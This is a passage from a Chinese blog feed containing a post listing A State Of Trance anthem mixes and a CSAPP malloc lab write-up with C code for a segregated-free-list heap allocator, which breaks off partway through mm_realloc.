            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>A State Of Trance Anthems &amp; Year Mixes</title>
      <link href="/2021/12/12/ASOT/"/>
      <url>/2021/12/12/ASOT/</url>
      
        <content type="html"><![CDATA[<h1 id="Year-Mix"><a href="#Year-Mix" class="headerlink" title="Year Mix"></a>Year Mix</h1><h2 id="Playlist"><a href="#Playlist" class="headerlink" title="Playlist"></a>Playlist</h2><center>    <iframe style="max-width: 420px;" frameborder="no" border="0" margin="0" padding="0" width=100% height=360 src="//music.163.com/outchain/player?type=4&id=794338505&auto=0&height=360"></iframe></center><h2 id="A-State-Of-Trance-1000-Celebration-Mix"><a href="#A-State-Of-Trance-1000-Celebration-Mix" class="headerlink" title="A State Of Trance 1000 - Celebration Mix"></a>A State Of Trance 1000 - Celebration Mix</h2><p><img src="https://img.lfalive.top/ASOT/1000.jpg"></p><h2 id="A-State-Of-Trance-Year-Mix-2004-2021"><a href="#A-State-Of-Trance-Year-Mix-2004-2021" class="headerlink" title="A State Of Trance Year Mix 2004-2021"></a>A State Of Trance Year Mix 2004-2021</h2><p><img src="https://img.lfalive.top/ASOT/2021.jpg"></p><p><img src="https://img.lfalive.top/ASOT/2020.jpg"></p><p><img src="https://img.lfalive.top/ASOT/2019.jpg"></p><p><img src="https://img.lfalive.top/ASOT/2018.jpg"></p><p><img src="https://img.lfalive.top/ASOT/2017.jpg"></p><p><img src="https://img.lfalive.top/ASOT/2016.jpg"></p><p><img src="https://img.lfalive.top/ASOT/2015.jpg"></p><p><img src="https://img.lfalive.top/ASOT/2014.jpg"></p><p><img src="https://img.lfalive.top/ASOT/2013.jpg"></p><p><img src="https://img.lfalive.top/ASOT/2012.jpg"></p><p><img src="https://img.lfalive.top/ASOT/2011.jpg"></p><p><img src="https://img.lfalive.top/ASOT/2010.jpg"></p><p><img src="https://img.lfalive.top/ASOT/2009.jpg"></p><p><img src="https://img.lfalive.top/ASOT/2008.jpg"></p><p><img src="https://img.lfalive.top/ASOT/2007.jpg"></p><p><img src="https://img.lfalive.top/ASOT/2006.jpg"></p><p><img src="https://img.lfalive.top/ASOT/2005.jpg"></p><p><img src="https://img.lfalive.top/ASOT/2004.jpg"></p><h1 id="Anthems"><a href="#Anthems" class="headerlink" title="Anthems"></a>Anthems</h1><h2 id="A-State-Of-Trance-Anthems-Mini-Mix"><a href="#A-State-Of-Trance-Anthems-Mini-Mix" class="headerlink" title="A State Of Trance Anthems (Mini Mix)"></a>A State Of Trance Anthems (Mini Mix)</h2><p>ASOT 450-950主题曲的一个Mini Mix。</p><div style="position:relative; padding-bottom:75%; width:100%; height:0"><iframe src="//player.bilibili.com/player.html?aid=86093896&bvid=BV1E7411x7SX&cid=147158676&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" style="position:absolute; height: 100%; width: 100%;"></iframe></div><p><strong>Tracklist：</strong></p><p>ASOT - A State Of Trance Anthems (Mini Mix) 2020-01-31</p><ol><li>Armin van Buuren - Let The Music Guide You (ASOT 950 Anthem) [ASOT]</li><li>Jorn van Deynhoven - The New Horizons (ASOT 650 Anthem) [ASOT]</li><li>Armin van Buuren &amp; Markus Schulz - The Expedition (ASOT 600 Theme) [ASOT]</li><li>Armin van Buuren - Together (In A State Of Trance) (ASOT 700 Anthem) [ASOT]</li><li>Gaia - Status Excessu D (Official ASOT 500 Anthem) [ARMIND]</li><li>Armin van Buuren - Lifting You Higher (ASOT 900 Anthem) [ASOT]</li><li>Armin van Buuren - Be In The Moment (ASOT 850 Anthem) [ASOT]</li><li>W&amp;W - Invasion (ASOT 550 Anthem) [ASOT]</li><li>Armin van Buuren - I Live For That Energy (ASOT 800 Theme) [ARMIND]</li><li>Ben Gold - I’m In A State Of Trance (ASOT 750 Anthem) [ASOT]</li><li>Sebastian Brandt - 450 (A State of Trance 450 Anthem) [ASOT]</li></ol><h2 id="Playlist-1"><a href="#Playlist-1" class="headerlink" title="Playlist"></a>Playlist</h2><p>ASOT 450-1000主题曲歌单，所有都是加长版。最喜欢的I Live For That Energy额外有Piano Version。</p>    <div id="aplayer-fuuiivzt" class="aplayer aplayer-tag-marker meting-tag-marker"         data-id="7118040864" data-server="netease" data-type="playlist" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#ad7a86"    ></div>]]></content>
      
      
      <categories>
          
          <category> 杂谈 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ASOT </tag>
            
            <tag> music </tag>
            
            <tag> Armin Van Burren </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSAPP实验——malloc lab</title>
      <link href="/2021/12/10/CSAPP-malloc/"/>
      <url>/2021/12/10/CSAPP-malloc/</url>
      
        <content type="html"><![CDATA[<h2 id="官网"><a href="#官网" class="headerlink" title="官网"></a>官网</h2><p><a href="http://csapp.cs.cmu.edu/3e/labs.html">http://csapp.cs.cmu.edu/3e/labs.html</a></p><blockquote><p>Students implement simple logical, two’s complement, and floating point functions, but using a highly restricted subset of C. For example, they might be asked to compute the absolute value of a number using only bit-level operations and straightline code. This lab helps students understand the bit-level representations of C data types and the bit-level behavior of the operations on data.</p></blockquote><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://zhuanlan.zhihu.com/p/126341872">[读书笔记]CSAPP：MallocLab</a></p><p><a href="https://blog.csdn.net/u012336567/article/details/52004250">CSAPP: Malloc lab</a></p><h2 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h2><p>在mm.c里完善一个自己的动态分配器。</p><ul><li><p><code>int mm_init(void);</code>: 调用其他几个函数前，调用<code>mm_init</code>进行必要的初始化。初始化发生错误时，应返回-1，正常则返回0。</p></li><li><p><code>void *mm_malloc(size_t size);</code>: 返回一个指针，指向一个至少<code>size</code>字节的已分配块的有效载荷。整个分配块应位于堆区域内，且不与任何其他分配块重叠。该函数应和<code>libc</code>中的<code>malloc</code>一样，总是返回 8 字节对齐的指针。</p></li><li><p><code>void mm_free(void *ptr);</code>: 释放指针<code>ptr</code>指向的块，不返回任何值。只有指针<code>ptr</code>是由<code>mm_malloc</code>或者<code>mm_realloc</code>先前返回的时候，该函数会保证正常工作。</p></li><li><p><code>void *mm_realloc(void *ptr, size_t size);</code>: 返回值同<code>mm_malloc</code>，但是有以下限制：</p><ul><li>如果<code>ptr</code>为空，等同于调用<code>mm_malloc(size)</code></li><li>如果<code>size=0</code>，等同于调用<code>mm free(ptr)</code></li><li>否则，指针<code>ptr</code>必须是由<code>mm_malloc</code>或者<code>mm_realloc</code>先前返回的。该函数修改该块的大小为<code>size</code>，然后返回新块的地址。新块的地址是否和旧块相同，取决于旧块的内部碎片情况和新块所请求的大小。</li><li>如果是”压缩“，旧块的部分内容扔保留。如果是”扩展“，旧块的内容保留，扩展区域为非初始化的。</li></ul></li></ul><h2 id="辅助函数"><a href="#辅助函数" class="headerlink" title="辅助函数"></a>辅助函数</h2><p>可以使用<code>memlib.c</code>里的函数。</p><ul><li><code>void *mem sbrk(int incr)</code>: Expands the heap by incr bytes, where incr is a positive non-zero integer and returns a generic pointer to the first byte of the newly allocated heap area. The semantics are identical to the Unix sbrk function, except that mem sbrk accepts only a positive non-zero integer argument.</li><li><code>void *mem heap lo(void)</code>: Returns a generic pointer to the first byte in the heap.</li><li><code>void *mem heap hi(void)</code>: Returns a generic pointer to the last byte in the heap.</li><li><code>size t mem heapsize(void)</code>: Returns the current size of the heap in bytes.</li><li><code>size t mem pagesize(void)</code>: Returns the system’s page size in bytes (4K on Linux systems).</li></ul><h2 id="评分"><a href="#评分" class="headerlink" title="评分"></a>评分</h2><p>调用<code>./mdriver -f short1-bal.rep -V</code>来查看单个文件的测试结果。该课程的其他测试数据可以从<a href="https://github.com/Davon-Feng/CSAPP-Labs/tree/master/yzf-malloclab-handout/traces">这里</a>下载，得到一个<code>trace</code>文件夹，然后调用<code>./mdriver -t ./trace -V</code>来查看测试结果。</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ul><li>分离空闲链表：segregated free list中按大小类分类，并且将该list表放在heap的头部，通过序言块将它与数据隔离。在每一个大小类中，空闲块按照size由小到大排序。</li><li>立即合并：free()后对空闲块立即合并。</li><li>最佳适配：因为同一大小类中空闲块由小到大排序，所以查找是第一个合适的就是最适配的。</li><li>改进的realloc：对于请求“扩展”这种情况，运用类似coalesce中的方法，先去检查前后是否有空闲块，并是否满足前后空闲块和当前已分配的空闲块size相加大于newsize，如果是则合并，不需要再重新请求空闲块。如果不行，则需要重新mm_malloc一块新的空间。</li></ul><h3 id="块的数据结构"><a href="#块的数据结构" class="headerlink" title="块的数据结构"></a>块的数据结构</h3><p><img src="https://img.lfalive.top/CSAPP-malloc/1.JPG"></p><p>空闲块使用两个字的空间分别记录了前驱和后继的空闲块，这样，所有空闲块就可以显式地链接起来，就能轻松地直接遍历所有的空闲块了。</p><h3 id="宏和全局变量"><a href="#宏和全局变量" class="headerlink" title="宏和全局变量"></a>宏和全局变量</h3><p>定义如下宏和全局变量：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* single word (4) or double word (8) alignment */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ALIGNMENT 8</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* rounds up to the nearest multiple of ALIGNMENT */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ALIGN(size) (((size) + (ALIGNMENT-1)) &amp; ~0x7)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SIZE_T_SIZE (ALIGN(sizeof(size_t)))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WSIZE 4</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DSIZE 8           <span class="comment">/*Double word size*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CHUNKSIZE (1&lt;&lt;12) <span class="comment">/*the page size in bytes is 4K*/</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX(x, y)    ((x)&gt;(y)?(x):(y))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PACK(size, alloc)    ((size) | (alloc))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GET(p)  (*(unsigned int *)(p))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PUT(p, val)  (*(unsigned int *)(p) = (val))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GET_SIZE(p)  (GET(p) &amp; ~0x7)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GET_ALLOC(p)    (GET(p) &amp; 0x1)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HDRP(bp)    ((char *)(bp)-WSIZE)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FTRP(bp)    ((char *)(bp)+GET_SIZE(HDRP(bp))-DSIZE)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PREV_LINKNODE_RP(bp) ((char*)(bp))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NEXT_LINKNODE_RP(bp) ((char*)(bp)+WSIZE)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NEXT_BLKP(bp)   ((char *)(bp)+GET_SIZE(((char *)(bp)-WSIZE)))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PREV_BLKP(bp)   ((char *)(bp)-GET_SIZE(((char *)(bp)-DSIZE)))</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">char</span> *heap_listp = <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">char</span> *block_list_start = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure><p><code>PREV_LINKNODE_RP</code>就是前文所提到的空闲块中的前驱指针，<code>NEXT_LINKNODE_RP</code>同理。<code>bp</code>指向的是块header下一个字的位置。</p><p><code>heap_listp</code>指向序言块的有效载荷，有如下结构：</p><p><img src="https://img.lfalive.top/CSAPP-malloc/2.JPG"></p><p><code>block_list_start</code>则是指向第一个空闲链表的位置。</p><h3 id="空闲链表"><a href="#空闲链表" class="headerlink" title="空闲链表"></a>空闲链表</h3><p>一共有10个空闲链表，不需要记录小于16Bytes的块，因为空闲块最小为16Bytes。空闲链表内的空闲块大小范围分别如下。</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">&#123;0-32&#125;,&#123;33-64&#125;,&#123;65-128&#125;,&#123;129-256&#125;,&#123;257-512&#125;,&#123;513-1024&#125;,&#123;1025-2048&#125;,&#123;2049-3072&#125;，&#123;3073-4096&#125;，&#123;4097-inf&#125;</span><br></pre></td></tr></table></figure><p><code>ins_block</code>是将一个空闲块插入对应的空闲链表中，注意要保证各块大小非递减，便于进行最佳适配。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">ins_block</span><span class="params">(<span class="type">char</span> *p)</span> &#123;</span><br><span class="line">   <span class="type">char</span> *root = find_list_root(GET_SIZE(HDRP(p)));</span><br><span class="line">   <span class="type">char</span> *prevp = root;</span><br><span class="line">   <span class="type">char</span> *nextp = GET(root);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">while</span> (nextp != <span class="literal">NULL</span>) &#123; <span class="comment">// prevp为小于当前块大小的最后一个元素</span></span><br><span class="line">      <span class="keyword">if</span> (GET_SIZE(HDRP(nextp)) &gt;= GET_SIZE(HDRP(p))) <span class="keyword">break</span>;</span><br><span class="line">      prevp = nextp;</span><br><span class="line">      nextp = GET(NEXT_LINKNODE_RP(nextp));</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">if</span> (prevp == root) &#123; <span class="comment">// 空链表，新结点作为根节点</span></span><br><span class="line">      PUT(root, p);</span><br><span class="line">      PUT(NEXT_LINKNODE_RP(p), nextp);</span><br><span class="line">      PUT(PREV_LINKNODE_RP(p), <span class="literal">NULL</span>);</span><br><span class="line">      <span class="keyword">if</span> (nextp != <span class="literal">NULL</span>) PUT(PREV_LINKNODE_RP(nextp), p);</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123; <span class="comment">// 插入到prevp结点之后</span></span><br><span class="line">      PUT(NEXT_LINKNODE_RP(prevp), p);</span><br><span class="line">      PUT(PREV_LINKNODE_RP(p), prevp);</span><br><span class="line">      PUT(NEXT_LINKNODE_RP(p), nextp);</span><br><span class="line">      <span class="keyword">if</span> (nextp != <span class="literal">NULL</span>) PUT(PREV_LINKNODE_RP(nextp), p);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>与其相对应的，<code>del_block</code>把某个块从相应链表中删除。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">del_block</span><span class="params">(<span class="type">char</span> *p)</span> &#123;</span><br><span class="line">   <span class="type">char</span> *root = find_list_root(GET_SIZE(HDRP(p)));</span><br><span class="line">   <span class="type">char</span> *prevp = GET(PREV_LINKNODE_RP(p));</span><br><span class="line">   <span class="type">char</span> *nextp = GET(NEXT_LINKNODE_RP(p));</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (prevp == <span class="literal">NULL</span> &amp;&amp; nextp == <span class="literal">NULL</span>) <span class="comment">//无先驱无后继</span></span><br><span class="line">   &#123;</span><br><span class="line">      PUT(root, <span class="number">0</span>);</span><br><span class="line">   &#125; <span class="keyword">else</span> <span class="keyword">if</span> (prevp != <span class="literal">NULL</span> &amp;&amp; nextp == <span class="literal">NULL</span>) <span class="comment">//有先驱无后继</span></span><br><span class="line">   &#123;</span><br><span class="line">      PUT(NEXT_LINKNODE_RP(prevp), nextp);</span><br><span class="line">   &#125; <span class="keyword">else</span> <span class="keyword">if</span> (prevp == <span class="literal">NULL</span> &amp;&amp; nextp != <span class="literal">NULL</span>) <span class="comment">//无先驱有后继</span></span><br><span class="line">   &#123;</span><br><span class="line">      PUT(PREV_LINKNODE_RP(nextp), <span class="number">0</span>);</span><br><span class="line">      PUT(root, nextp);</span><br><span class="line">   &#125; <span class="keyword">else</span> <span class="keyword">if</span> (prevp != <span class="literal">NULL</span> &amp;&amp; nextp != <span class="literal">NULL</span>) <span class="comment">//有先驱有后继</span></span><br><span class="line">   &#123;</span><br><span class="line">      PUT(PREV_LINKNODE_RP(nextp), prevp);</span><br><span class="line">      PUT(NEXT_LINKNODE_RP(prevp), nextp);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   PUT(NEXT_LINKNODE_RP(p), <span class="literal">NULL</span>);</span><br><span class="line">   PUT(PREV_LINKNODE_RP(p), <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>find_list_root</code>是计算某个大小为size的空闲块应该对应于哪个空闲链表，返回对应空闲链表的首地址。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">find_list_root</span><span class="params">(<span class="type">size_t</span> size)</span> &#123;</span><br><span class="line">   <span class="type">int</span> i;</span><br><span class="line">   <span class="comment">// 不需要记录小于16bytes的块，因为空闲块最小为16bytes。</span></span><br><span class="line">   <span class="keyword">if</span> (size &lt;= <span class="number">32</span>) i = <span class="number">0</span>;</span><br><span class="line">   <span class="keyword">else</span> <span class="keyword">if</span> (size &lt;= <span class="number">64</span>) i = <span class="number">1</span>;</span><br><span class="line">   <span class="keyword">else</span> <span class="keyword">if</span> (size &lt;= <span class="number">128</span>) i = <span class="number">2</span>;</span><br><span class="line">   <span class="keyword">else</span> <span class="keyword">if</span> (size &lt;= <span class="number">256</span>) i = <span class="number">3</span>;</span><br><span class="line">   <span class="keyword">else</span> <span class="keyword">if</span> (size &lt;= <span class="number">512</span>) i = <span class="number">4</span>;</span><br><span class="line">   <span class="keyword">else</span> <span class="keyword">if</span> (size &lt;= <span class="number">1024</span>) i = <span class="number">5</span>;</span><br><span class="line">   <span class="keyword">else</span> <span class="keyword">if</span> (size &lt;= <span class="number">2048</span>) i = <span class="number">6</span>;</span><br><span class="line">   <span class="keyword">else</span> <span class="keyword">if</span> (size &lt;= <span class="number">3072</span>) i = <span class="number">7</span>;</span><br><span class="line">   <span class="keyword">else</span> <span class="keyword">if</span> (size &lt;= <span class="number">4096</span>) i = <span class="number">8</span>;</span><br><span class="line">   <span class="keyword">else</span> i = <span class="number">9</span>;</span><br><span class="line">   <span class="comment">/*find the index of bin which will put this block */</span></span><br><span class="line">   <span class="keyword">return</span> block_list_start + i * WSIZE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="mm-init"><a href="#mm-init" class="headerlink" title="mm_init"></a>mm_init</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * mm_init - initialize the malloc package.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">mm_init</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">   <span class="type">int</span> ind;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> ((heap_listp = mem_sbrk(<span class="number">14</span> * WSIZE)) == (<span class="type">void</span> *) <span class="number">-1</span>) <span class="keyword">return</span> <span class="number">-1</span>; <span class="comment">// 申请14字空间</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">for</span> (ind = <span class="number">0</span>; ind &lt; <span class="number">10</span>; ind++) PUT(heap_listp + ind * WSIZE, <span class="number">0</span>); <span class="comment">//block list</span></span><br><span class="line">   PUT(heap_listp + <span class="number">10</span> * WSIZE, <span class="number">0</span>);   <span class="comment">/*Alignment padding*/</span></span><br><span class="line">   PUT(heap_listp + <span class="number">11</span> * WSIZE, PACK(DSIZE, <span class="number">1</span>)); <span class="comment">/*Prologue header*/</span></span><br><span class="line">   PUT(heap_listp + <span class="number">12</span> * WSIZE, PACK(DSIZE, <span class="number">1</span>)); <span class="comment">/*Prologue footer*/</span></span><br><span class="line">   PUT(heap_listp + <span class="number">13</span> * WSIZE, PACK(<span class="number">0</span>, <span class="number">1</span>)); <span class="comment">/*Epilogue header*/</span></span><br><span class="line"></span><br><span class="line">   block_list_start = heap_listp;</span><br><span class="line">   heap_listp += <span class="number">12</span> * WSIZE; <span class="comment">/*指向序言块*/</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> ((extend_heap(CHUNKSIZE / WSIZE)) == <span class="literal">NULL</span>) ? <span class="number">-1</span> : <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>和CSAPP书上的例程没有太大区别，主要是加入了block list，放在序言块之前。注意申请的堆大小要保持双字对齐，使用padding块同时还可以将序言块和block list部分隔开。heap_listp仍是指向序言块的有效载荷。涉及到的<code>extend_heap</code>和<code>coalesce</code>函数如下。主要注意链表和<code>NEXT_LINKNODE_RP</code>等字段的维护。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> *<span class="title function_">extend_heap</span><span class="params">(<span class="type">size_t</span> words)</span> &#123;</span><br><span class="line">   <span class="type">char</span> *bp;</span><br><span class="line">   <span class="type">size_t</span> size;</span><br><span class="line">   <span class="comment">// 分配空间双字对齐</span></span><br><span class="line">   size = (words % <span class="number">2</span>) ? (words + <span class="number">1</span>) * WSIZE : words * WSIZE;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> ((bp = mem_sbrk(size)) == (<span class="type">void</span> *) <span class="number">-1</span>) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">   PUT(HDRP(bp), PACK(size, <span class="number">0</span>));</span><br><span class="line">   PUT(FTRP(bp), PACK(size, <span class="number">0</span>));</span><br><span class="line">   PUT(NEXT_LINKNODE_RP(bp), <span class="literal">NULL</span>);</span><br><span class="line">   PUT(PREV_LINKNODE_RP(bp), <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">   PUT(HDRP(NEXT_BLKP(bp)), PACK(<span class="number">0</span>, <span class="number">1</span>)); <span class="comment">/*New Epilogue header*/</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> coalesce(bp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*coalesce the empty block*/</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *<span class="title function_">coalesce</span><span class="params">(<span class="type">void</span> *bp)</span> &#123;</span><br><span class="line">   <span class="type">size_t</span> prev_alloc = GET_ALLOC(FTRP(PREV_BLKP(bp)));</span><br><span class="line">   <span class="type">size_t</span> next_alloc = GET_ALLOC(HDRP(NEXT_BLKP(bp)));</span><br><span class="line">   <span class="type">size_t</span> size = GET_SIZE(HDRP(bp));</span><br><span class="line"></span><br><span class="line">   <span class="comment">/*coalesce the block and change the point*/</span></span><br><span class="line">   <span class="comment">/*prev_alloc &amp;&amp; next_alloc不做任何合并*/</span></span><br><span class="line">   <span class="keyword">if</span> (prev_alloc &amp;&amp; !next_alloc) &#123;</span><br><span class="line">      size += GET_SIZE(HDRP(NEXT_BLKP(bp)));</span><br><span class="line">      del_block(NEXT_BLKP(bp));</span><br><span class="line">      PUT(HDRP(bp), PACK(size, <span class="number">0</span>));</span><br><span class="line">      PUT(FTRP(bp), PACK(size, <span class="number">0</span>));</span><br><span class="line">   &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!prev_alloc &amp;&amp; next_alloc) &#123;</span><br><span class="line">      size += GET_SIZE(HDRP(PREV_BLKP(bp)));</span><br><span class="line">      del_block(PREV_BLKP(bp));</span><br><span class="line">      PUT(FTRP(bp), PACK(size, <span class="number">0</span>));</span><br><span class="line">      PUT(HDRP(PREV_BLKP(bp)), PACK(size, <span class="number">0</span>));</span><br><span class="line">      bp = PREV_BLKP(bp);</span><br><span class="line">   &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!prev_alloc) &#123;</span><br><span class="line">      size += GET_SIZE(FTRP(NEXT_BLKP(bp))) + GET_SIZE(HDRP(PREV_BLKP(bp)));</span><br><span class="line">      del_block(PREV_BLKP(bp));</span><br><span class="line">      del_block(NEXT_BLKP(bp));</span><br><span class="line">      PUT(FTRP(NEXT_BLKP(bp)), PACK(size, <span class="number">0</span>));</span><br><span class="line">      PUT(HDRP(PREV_BLKP(bp)), PACK(size, <span class="number">0</span>));</span><br><span class="line">      bp = PREV_BLKP(bp);</span><br><span class="line">   &#125;</span><br><span class="line">   ins_block(bp);</span><br><span class="line">   <span class="keyword">return</span> bp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="mm-malloc"><a href="#mm-malloc" class="headerlink" title="mm_malloc"></a>mm_malloc</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * mm_malloc - Allocate a block by incrementing the brk pointer.</span></span><br><span class="line"><span class="comment"> *     Always allocate a block whose size is a multiple of the alignment.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> *<span class="title function_">mm_malloc</span><span class="params">(<span class="type">size_t</span> size)</span> &#123;</span><br><span class="line">   <span class="type">size_t</span> asize;</span><br><span class="line">   <span class="type">size_t</span> extendsize;</span><br><span class="line">   <span class="type">char</span> *bp;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (size == <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">   asize = size &lt;= DSIZE ? <span class="number">2</span> * DSIZE : DSIZE * ((size + (DSIZE) + (DSIZE - <span class="number">1</span>)) / DSIZE);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> ((bp = find_fit(asize)) == <span class="literal">NULL</span>) &#123; <span class="comment">// 最优适配失败, apply new block</span></span><br><span class="line">      extendsize = MAX(asize, CHUNKSIZE);</span><br><span class="line">      <span class="keyword">if</span> ((bp = extend_heap(extendsize / WSIZE)) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">         <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   place(bp, asize);</span><br><span class="line">   <span class="keyword">return</span> bp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">place</span><span class="params">(<span class="type">void</span> *bp, <span class="type">size_t</span> asize)</span> &#123;</span><br><span class="line">    <span class="type">size_t</span> csize = GET_SIZE(HDRP(bp));</span><br><span class="line">    <span class="comment">/*remove from empty_list*/</span></span><br><span class="line">    del_block(bp);</span><br><span class="line">    <span class="keyword">if</span> ((csize - asize) &gt;= <span class="number">2</span> * DSIZE) &#123;</span><br><span class="line">        PUT(HDRP(bp), PACK(asize, <span class="number">1</span>));</span><br><span class="line">        PUT(FTRP(bp), PACK(asize, <span class="number">1</span>));</span><br><span class="line">        bp = NEXT_BLKP(bp);</span><br><span class="line"></span><br><span class="line">        PUT(HDRP(bp), PACK(csize - asize, <span class="number">0</span>));</span><br><span class="line">        PUT(FTRP(bp), PACK(csize - asize, <span class="number">0</span>));</span><br><span class="line">        PUT(NEXT_LINKNODE_RP(bp), <span class="number">0</span>);</span><br><span class="line">        PUT(PREV_LINKNODE_RP(bp), <span class="number">0</span>);</span><br><span class="line">        coalesce(bp);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        PUT(HDRP(bp), PACK(csize, <span class="number">1</span>));</span><br><span class="line">        PUT(FTRP(bp), PACK(csize, <span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="mm-free"><a href="#mm-free" class="headerlink" title="mm_free"></a>mm_free</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * mm_free - Freeing a block does nothing.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">mm_free</span><span class="params">(<span class="type">void</span> *ptr)</span> &#123;</span><br><span class="line">   <span class="keyword">if</span> (ptr == <span class="number">0</span>) <span class="keyword">return</span>;</span><br><span class="line">   <span class="type">size_t</span> size = GET_SIZE(HDRP(ptr));</span><br><span class="line"></span><br><span class="line">   PUT(HDRP(ptr), PACK(size, <span class="number">0</span>));</span><br><span class="line">   PUT(FTRP(ptr), PACK(size, <span class="number">0</span>));</span><br><span class="line">   PUT(NEXT_LINKNODE_RP(ptr), <span class="literal">NULL</span>);</span><br><span class="line">   PUT(PREV_LINKNODE_RP(ptr), <span class="literal">NULL</span>);</span><br><span class="line">   coalesce(ptr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也是要注意<code>NEXT_LINKNODE_RP</code>等字段的维护。采用的是立即合并策略，释放后就立即尝试与前后空闲块进行合并。</p><h3 id="重点：mm-realloc"><a href="#重点：mm-realloc" class="headerlink" title="重点：mm_realloc"></a>重点：mm_realloc</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * mm_realloc - Implemented simply in terms of mm_malloc and mm_free</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> *<span class="title function_">mm_realloc</span><span class="params">(<span class="type">void</span> *ptr, <span class="type">size_t</span> size)</span> &#123;</span><br><span class="line">   <span class="type">size_t</span> oldsize = GET_SIZE(HDRP(ptr));</span><br><span class="line">   <span 